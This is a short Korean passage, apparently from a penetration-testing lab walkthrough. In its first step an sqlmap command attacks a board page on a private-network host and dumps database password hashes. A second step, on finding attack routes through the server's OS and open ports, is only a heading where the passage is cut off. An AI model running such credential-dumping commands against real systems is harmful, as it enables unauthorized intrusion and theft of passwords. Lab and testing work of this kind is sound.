...
1️⃣ 웹 취약점 분석 및 DB 해시 획득
```
sqlmap -u "http://192.168.205.100/m_board.php?ps_db=freeboard" --passwords
```

2️⃣ 웹 서버의 운영체제와 열려있는 포트로 공격 루트 찾기
```
